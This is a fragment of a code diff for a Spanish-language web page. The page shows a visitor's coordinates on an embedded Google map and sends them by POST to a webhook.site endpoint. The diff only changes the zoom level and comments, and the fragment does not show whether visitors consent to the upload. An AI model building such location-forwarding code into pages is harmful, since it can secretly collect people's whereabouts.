@@ -28,19 +28,19 @@
                             Longitud: ${lon}
                         `;
 
-                        // Mostrar mapa embebido
+                        // Mostrar mapa embebido en tiempo real
                         mapa.innerHTML = `
                             <iframe 
                                 width="100%" 
                                 height="400" 
                                 frameborder="0" 
                                 style="border:0" 
-                                src="https://www.google.com/maps?q=${lat},${lon}&hl=es&z=14&output=embed" 
+                                src="https://www.google.com/maps?q=${lat},${lon}&hl=es&z=15&output=embed" 
                                 allowfullscreen>
                             </iframe>
                         `;
 
-                        // 🔄 Enviar ubicación a tu servidor o webhook
+                        // 🔄 Enviar ubicación a tu webhook
                         fetch("https://webhook.site/41f0c047-e8a5-401f-8459-f9671b2347ee", {
                             method: "POST",
                             headers: { "Content-Type": "application/json" },
